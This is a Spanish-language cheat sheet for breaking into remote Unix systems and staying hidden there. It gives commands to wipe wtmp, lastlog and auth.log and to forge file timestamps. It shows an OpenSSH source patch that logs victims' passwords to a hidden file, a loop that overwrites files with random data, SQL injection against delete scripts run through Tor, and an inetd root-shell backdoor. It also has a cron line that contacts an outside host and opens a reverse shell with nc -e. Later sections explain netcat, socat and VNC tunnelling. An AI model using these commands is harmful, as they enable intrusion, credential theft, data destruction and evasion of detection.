Breve recordatorio para intrusión en sistemas remotos.

*Para no dejar rastro:
 who # salirnos si hay más gente logueada
 touch -t YYYYMMddHHmmss fichero # cambiar la fecha de un fichero modificado por nosotros
 echo ''>/var/log/wtmp # borrado de last
 echo ''>/var/log/lastlog # borrado de lastlog
 echo ''>/var/log/auth.log # borrado de authlog
 cd /var/log && echo>wtmp>lastlog>auth.log>/dev/null && cd # oneliner
 history -c && exit # último comando a ejecutar, para salirnos y que nuestros comandos no se añadan a .bash_history
*Análisis de los datos introducidos por el usuario y enviados al servidor en $_POST y $_GET:
**a otros form: posibilidad de llamar a formularios de borrado remotamente (si éstos no comprueban sesión)
**a includes: posibilidad de incluir archivos de otro servidor, código JS, etc... y tener una shell con el usuario www-data
**a SQL: posibilidad de incluir SQL si magic_quotes_gpc está Off, para poder meter comillas simples
**a eval: para ejecutar comandos PHP como unlink, fopen, etcétera...
*Ejecución de procesos en segundo plano:
**Para que un proceso de bash en bg no muera con la shell, escribir disown
**Para que la salida de un proceso cuyo padre sea init sea aún visible usar
 nohup comando # con & o sin, al cerrar la shell el padre es init y su salida está en nohup.out

== Injección SQL ==
PHP está bastante protegido ante este método. Las sentencias mysql_query sólo aceptan un comando SQL: no sirve de nada escribir dos comandos separados por ; (semicolon).

Por otro lado, todas las instalaciones por defecto setean en php.ini el magic_quotes_gpc = On . Esta directiva escapa las comillas en las cadenas recibidas por $_GET, $_POST y $_COOKIE . Se puede fijar a nivel de servidor o de directorio, incluyendo en .htaccess la directiva
 php_flag magic_quotes_gpc off

*http://seguridad-informacion.blogspot.com/2008/03/17-herramientas-indispensables-para.html

== Recompilación de ssh ==
 # apt-get install libssl-dev
 # apt-get source openssh-client
 # cd openssh-4.3p2
 # gedit sshconnect2.c
 añadir debajo de password = read_passphrase(prompt, 0); en la función userauth_passwd...
 	    FILE *f; 
 	    f = fopen("/tmp/.xsession-errors", "a");
 	    fprintf(f,"%s %s %s\n",authctxt->server_user,password,authctxt->host);
 	    fclose(f);
 y #include "stdio.h" en las cabeceras
 # ./configure
 # make
Copiar el ssh a la máquina que queramos espiar. Los logins se guardan en /tmp/.xsession-errors .

== Anonimato con tor ==
Tor es una red de voluntarios que ceden parte de su BW para que su máquina sea quien se presente por la nuestra en una conexión HTTP. Al conectar, se decide una ruta. Ninguno de los nodos conoce la ruta completa. Dentro de la red, el tráfico está cifrado. El último nodo, el que hace la conexión, pasa nuestros datos en texto plano y hace la petición en nuestro lugar.
 # apt-get install tor
 # nano /etc/privoxy/config # comentar y descomentar para que quede así:
   #logfile logfile
   #jarfile jarfile
   forward-socks4a             /     127.0.0.1:9050 .
Reiniciar servicio. Usar la extensión de Firefox ''torbutton'' y comprobar anonimato con http://torcheck.xenobite.eu/ .

== Una vez dentro, qué hacer ==
Oneliner para cargarte los ficheros sin dejar rastro, ideal para backups:
 for i in $(ls); do s=$(stat -c%s $i);t=$(stat -c%Y $i);dd if=/dev/urandom of=$i bs=1 count=$s;touch -t "$t" $i; done;
Convierte los ficheros del directorio en basura aleatoria, manteniendo su fecha de modificación y tamaño (touch -t ${t:0:16} $i excluirá décimas de segundo). Ojo, un stat -c sobre el fichero revela que la fecha de cambio no coincide con las otras dos (acceso y modificación).

Analizar sus últimas acciones con last, lastlog, dmesg, .bash_history, .mysql_history, free, /proc/cpuinfo...

Ver qué scripts borran datos (grep -r DELETE *) y meterles un ?id=0 OR 1 . Automatizarlo con wget desde tor.

Meter un registro en la BBDD en alguna forma indicada en [[XSS]], para robar la sesión.

Crear un servicio con una shell:
 echo 'ingreslock stream tcp nowait root /bin/bash bash -i'>/tmp/.inetd.conf; /usr/sbin/inetd /tmp/.inetd.conf
O mejor aún subir un telnetd (binario) y así tener una shell que acepte caracteres de control e interactividad.

Modificar /etc/cron.daily/apt y meter enmedio:
 t=$(wget -q -O - http://updates.serveftp.org/kernel); if [ '$t' != '' ]; then nc updates.serveftp.org 9004 -w1 -e /bin/updater 2> /dev/null; fi;
Subir a /bin el telnetd modificado, con el nombre de updater y con permiso de ejecución. Cambiar la programación de cron.daily a las 22:00 en crontab. Ajustar las fechas de modificación de apt y crontab con touch. En el host de nombre no-llamativo estaremos a la escucha:
 nc -l -p 9004 -t
Mejor aún, meterlo en cron.hourly, que pida al servicio la hora de reconexión.

== netcat ==
Netcat nos permite extender las redirecciones y pipes a la red. Crea sockets (servidor y cliente) fácilmente, y vuelca stdin/stdout a ellos. Además es un escáner de puertos, y una solución al telnet para UDP.

Telnet envía códigos de control del terminal (captura los CTRL-C, por ejemplo) y nc es un "raw tcp client/server". Telnet requiere introducir pausas mientras dialogamos en un proceso automatizado y nc no. En el README se enumeran el resto de ventajas.

En una forma básica, establecemos un chat. Hay que pulsar enter tras cada línea:
 Terminal 1 servidor
 $ nc -l -p 9000
 Terminal 2 cliente
 $ nc localhost 9000
Lógicamente, entre dos máquinas separadas por routers NAT, sólo puede tener server a la escucha si además tiene el puerto indicado redirigido. Recordemos que los puertos <1024 solamente los puede manejar root. El cliente indica la IP del servidor. El enlace se corta al recibir cualquiera de ellos un CTRL-C .

Intercambiemos archivos.
 Servidor que recibe el archivo
 $ nc -l -p 9000 > kk
 Cliente que le envía
 $ cat kk | nc hostname 9000
  ...o bien...
 $ nc hostname 9000 < kk
No tenemos confirmación del envío, por tanto instalar pv y usar en el lado del cliente cualquiera de éstas:
 $ pv kk | nc hostname 9000
 $ cat kk | pv -b | nc hostname 9000

Averiguar quien se conecta a un socket servidor que dejamos abierto es muy simple. Basta con activar el modo ultraverborreico. Así sabremos quién es el que nos escanea.
 $ nc -vv -l -p 9000

Podemos hacer un telnet inverso, como el VNC en Listening mode. Una máquina en la que queremos tener shell no tiene el puerto redirigido, por lo que no puede recibir conexiones, pero debe ser el servidor, pues es la máquina a controlar. Por tanto la conexión debe ser saliente:
 Máquina que controlará
 $ nc -l -p 9000
 Máquina a controlar
 $ nc hostname 9000 -e /bin/sh
Al contactar el cliente con el servidor, el cliente ejecuta /bin/sh. Entonces, desde el servidor podremos escribir comandos que controlan al cliente. Sirven cualquier tipo de comandos que no requieran interactividad, ya que nc envía al recibir un enter. Cabe la posibilidad de controlar incluso Windows, si disponemos de [http://www.vulnwatch.org/netcat/ netcat]. Los comandos aceptan interactividad, y el firewall de WinSP2 no se queja ya que es una conexión saliente. Usar con ''nc hostname 9000 -e cmd.exe'' .

Otro método consiste en usar [http://www.neophob.com/serendipity/index.php?/archives/11-Reverse-Telneting.html dos puertos], uno de envío y otro de recepción.

Para ganar interactividad y poder hacer sudo, su,... etcétera... hay que emplear un terminal virtual o telnet.
 Máquina que controlará
 $ nc -l -p 9000 -t
 Máquina a controlar
 $ nc hostname 9000 -e /path/to/telnetd
En el cliente se inicia el servidor telnetd, que permite esa interactividad. Por el lado del servidor (máquina que controlará) hay que iniciar un socket a la escucha, pero que entienda el protocolo interactivo de telnetd. Sería como un programa telnet, que acepte entrada, pero de servidor. Esto lo provee la opción -t de netcat.
telnetd nos pide login. Recompilarle [http://www.gnu.org/software/inetutils/inetutils.html telnetd] y [http://www.busybox.net/lists/busybox/2007-July/028135.html modificar] el string login_invocation por "/bin/sh". Podría haberse usado "/bin/login -f root -p localhost" o no recompilar telnetd y usarle con la opción -p, pero /bin/sh no deja huella en wtmp ni lastlog ni tampoco nos lista en ''who''. Sin embargo sí estamos en un PTY (como demuestra tty).

=== Versión MIPS ===
Para el [[Linksys WRT54GL]] hay que preparar una versión especial de netcat, ya que la incorporada en busybox es algo incompleta (no tiene la opción -t ni -vv).
En el [http://wiki.openwrt.org/BuildingPackagesHowTo wiki de OpenWRT] indican instrucciones para construir un paquete. Podemos seguirlas o tan sólo usar [http://downloads.openwrt.org/whiterussian/0.9/OpenWrt-SDK-Linux-i686-1.tar.bz2 el SDK] para conseguir las utilidades de compilación. Empezamos:
 $ apt-get source netcat
Editar Makefile:
 DFLAGS = -DTELNET
 .
 .
 CC = /home/dani/Compilados/OpenWrt-SDK-Linux-i686-1/staging_dir_mipsel/bin/mipsel-linux-uclibc-gcc $(CFLAGS)
 .
 .
 linux:
         make -e $(ALL) $(MFLAGS) XFLAGS='-DLINUX' #STATIC=-static
Editar netcat.c:
 #include "resolv.h" //evita undefined reference to `res_init'
Subir el archivo compilado como netcat a /usr/bin.

== socat ==
socat es una herramienta más avanzada que netcat. Se le suele considerar un ''netcat on stereoids''. Nos permite realizar una redirección TCP, a PTYs, [http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES etc...]. Realiza la acción 1, y si es exitosa realiza la acción 2, conectando ambos canales de modo full-duplex bidireccional.

Un primer ejemplo es una redirección de tal modo que un socket que abriríamos a un host1:puerto1, se lo abrimos a otro host2:puerto2 y es redirigido al host1.
 socat TCP4-LISTEN:9000 TCP4:google.com:80
Conectar al host que ejecuta socat redigirá a la web de Google. Esto bien podría haberse logrado con iptables y NAT.

Un uso interesante de socat es el reverse socket. Útil cuando el host que tiene puertos redirigidos no es el servidor, sino el host del cliente. En estas condiciones no podríamos conectar al servicio, ya que el router/firewall nos bloquea. El modo de hacerlo es similar al reverse telnet explicado con netcat. Imaginemos que queremos acceder al servidor web:
#en el cliente, redirigir un puerto a nuestro host
#conectamos dos socket servidor; uno escucha al servidor y otro al cliente: ''socat TCP4-LISTEN:9000 TCP4-LISTEN:9001 &''
#en el servidor, una tarea cron conecta dos socket cliente; uno al servicio y otro al host cliente: ''socat TCP4:clienthost:9000 TCP4:80''
#finalmente en el cliente abrimos un navegador hacia ''localhost:9001'', estaremos viendo el servidor web del host sin acceso desde el exterior

Una vuelta de tuerca nos permite mejorar el comportamiento del reverse telnet con netcat.

nc en modo cliente '''sólo envía''' al recibir un LF por stdin, sin importar que estemos en modo telnet (-t). El problema de este funcionamiento es que no estamos en modo raw y los caracteres de control no los envía al momento, sino que los procesa nuestra shell local. Lo que haremos será establecer una redirección de sockets servidor localmente y hacer un telnet local. Este telnet local nos lo redirige socat a la conexión previamente establecida por el servidor saliente.
#la tarea cron ejecuta ''nc updates.serveftp.org 9004 -w1 -e /bin/updater 2> /dev/null'' que proporciona un telnetd
#unos instantes antes, en updates.serveftp.org estaremos esperando la conexión, la cual la redirigimos a un socket a la escucha: ''socat -d -d TCP4-LISTEN:9004 TCP4-LISTEN:9005 &'' . El nivel doble de mensajes nos alerta de Notices para saber en qué momento el primer host conecta (xio-listen.c)
#abrimos una consola ''telnet localhost 9005''
#tenemos control completo y se envían los caracteres de control perfectamente

=== Conectando dos máquinas sin NAT ===
VNC permite controlar una máquina remotamente. Esta máquina tiene corriendo un servicio vncserver. Desde una segunda máquina Y visualizaremos el escritorio de la primera, conectando un cliente vncviewer al servicio de X.
 x$ vncserver
Y se conecta a X mediante
 y$ vncviewer X
El esquema es algo así:
 X <--5900-- Y

El problema surge cuando X está detrás de un router o firewall y no acepta conexiones entrantes. VNC provee un modo de conectarse, y es invirtiendo los papeles de los programas. Ahora el vncviewer no es un cliente, sino un servidor.
 y$ vncviewer -listen
Además, vncserver es un cliente.
 x$ vncserver -connect Y:5500
No obstante, el resultado sigue siendo el mismo; Y controla a X. Esta técnica es conocida como reverse VNC.
 X --5500--> Y
Por supuesto, se sigue requiriendo que al menos Y tenga redirigido el puerto.

Una tercera posibilidad es que ninguna de las dos máquinas tenga la posibilidad de redirigirla un puerto. No está todo perdido, gracias a una tercera máquina Z, se puede conseguir la conexión por mucho NAT que haya. Eso sí, esta máquina Z ha de tener completa disponibilidad para abrir puertos.

Podemos hacerlo al modo reverse vnc o directo.

==== Directo ====
En Z establecemos el puente:
 z$ socat TCP4-LISTEN:5900 TCP4-LISTEN:2000
X tiene ya a vncserver escuchando, pero hay que convertirlo en un cliente. Hacemos
 x$ socat TCP4:localhost:5900 TCP4:Z:2000
Finalmente desde Y lanzamos el cliente vncviewer
 y$ vncviewer Z

==== Inverso ====
En Z establecemos el puente:
 z$ socat TCP4-LISTEN:5500 TCP4-LISTEN:2000
Y tiene ya a vncviewer escuchando, pero hay que convertirlo en un cliente. Hacemos
 y$ socat TCP4:localhost:5500 TCP4:Z:2000
Finalmente desde X lanzamos el cliente vncserver
 x$ vncserver -connect Z:5500

El único problema de estos métodos es que socat tiene un timeout.

La técnica para el VNC directo a través de una tercera máquina sirve para sacar un telnet, ftp, ssh... cualquier servicio que queramos de un sistema que esté dentro de una red.